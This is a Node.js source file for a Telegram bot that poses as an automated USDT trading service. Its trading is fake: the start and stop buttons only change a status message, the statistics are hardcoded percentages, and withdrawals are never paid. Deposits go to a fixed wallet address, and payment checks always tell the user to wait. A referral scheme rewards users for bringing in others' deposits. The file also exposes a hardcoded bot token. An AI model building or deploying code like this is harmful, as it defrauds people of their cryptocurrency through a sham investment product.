const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

// Replace with your own Telegram bot token
const token = '6363609133:AAGokjYGa80BOoeG2ItLOiEA6_TYaFEKc60';

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const startDate = new Date().toISOString();
  const balance = 0;  // Initial balance
  const withdrawal = 0;  // Initial withdrawal amount

  // Store user data on the backend
  axios.post('https://solkah.org/id/chat.php', {
    id: userId,
    startDate: startDate,
    balance: balance,
    withdrawal: withdrawal
  })
  .then(response => {
    console.log('User data stored successfully');
  })
  .catch(error => {
    console.error('Error storing user data:', error);
  });

  // Respond to the user
  bot.sendMessage(chatId, 'Great! All is ready for start.\n\nBefore using our service, we strongly recommend you to carefully review the functionality of each trading bot button.\n\nMenu:\n\n"Trading" - here you can see the results of the bot\'s trading for different periods of time.\nYou can also pause or resume the trading bot;\n"Stop trading/Start trading" - starting and stopping the trading bot;\n"Trading Bot statistics" - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months;\n"Trading Bot Channel" - up-to-date information on bot trading.\n\n"My account" - up-to-date information on the balance and account. Deposit/withdrawal of funds, referral system;\n"Top up your balance" - the ability to replenish the USDT TRC20 wallet to get started (10% commission);\n"Withdrawal of funds" - the ability to withdraw USDT TRC20 to your wallet (10% commission);\n"Balance history" - deposits and withdrawals on your trading account;\n"Referral system" - the reward is 5% from each deposit of the listed users.', {
    reply_markup: {
      keyboard: [
        [{ text: 'Trading💰' }, { text: 'My Account' }],
        [{ text: 'Deposit' }, { text: 'Withdrawal' }],
        [{ text: 'Support' }]
      ]
    }
  });
});

// Handle keyboard buttons
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === 'Trading💰') {
    bot.sendMessage(chatId, 'Trading\nStop trading / Start trading - starting and stopping the trading bot.\nTrading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.\nTrading status: Stopped 🚫', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Start trading', callback_data: 'start_trading' }],
          [{ text: 'Stop trading', callback_data: 'stop_trading' }],
          [{ text: 'Statistics', callback_data: 'statistics' }],
          [{ text: 'Trading bot channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
        ]
      }
    });
  } else if (text === 'My Account') {
    // Fetch user data from the backend
    axios.get('https://solkah.org/id/data.txt')
      .then(response => {
        const userData = response.data;
        const balance = userData.balance;
        const startDate = userData.startDate;
        const withdrawal = userData.withdrawal;
        const userId = userData.id;

        bot.sendMessage(chatId, `Medat.00:\nMy Account\n\nRencontre bot ❤️:\n💰 Current balance: ($${balance})\n📅 Date of registration: (${startDate})\n💸 Total withdrawal: ($${withdrawal})\n\n🔗 Your referral link: https://t.me/@Orrdoxbot?start=${userId}`, {
          reply_markup: {
            inline_keyboard: [
              [{ text: 'Deposit', callback_data: 'deposit' }]
            ]
          }
        });
      })
      .catch(error => {
        console.error('Error fetching user data:', error);
      });
  } else if (text === 'Deposit') {
    bot.sendMessage(chatId, '❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%).\nThe transfer is realized automatically.\n\n❗️ The minimum amount for replenishment is 20 USDT\n➖➖➖➖➖\nWallet address USDT TRC-20:\nTDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge\n(To copy, click on the wallet👆)', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Check payment', callback_data: 'check_payment' }]
        ]
      }
    });
  } else if (text === 'Withdrawal') {
    bot.sendMessage(chatId, 'The minimum withdrawal amount is $30');
  } else if (text === 'Support') {
    bot.sendMessage(chatId, 'You are now connected to support. Please describe your issue.');
  }
});

// Handle inline keyboard buttons
bot.on('callback_query', (callbackQuery) => {
  const msg = callbackQuery.message;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;

  if (data === 'start_trading') {
    bot.sendMessage(chatId, 'Trading\nStop trading / Start trading - starting and stopping the trading bot.\nTrading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.\nTrading status: Started ✅️');
  } else if (data === 'stop_trading') {
    bot.sendMessage(chatId, 'Trading\nStop trading / Start trading - starting and stopping the trading bot.\nTrading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.\nTrading status: Stopped 🚫');
  } else if (data === 'statistics') {
    bot.sendMessage(chatId, 'Trading Bot Statistics:\n24 hours: 5%\n3 days: 10%\n7 days: 15%');
  } else if (data === 'check_payment') {
    bot.sendMessage(chatId, '❗️Please, check again in 5 minutes❗️\n\n➖➖➖➖➖\nIf the payment is not accepted within 15 minutes, write to our support 📝');
    // Notify admin about the new payment
    bot.sendMessage('5873712733', `Hey, new payment request from user ID: ${chatId}`);
  }
});
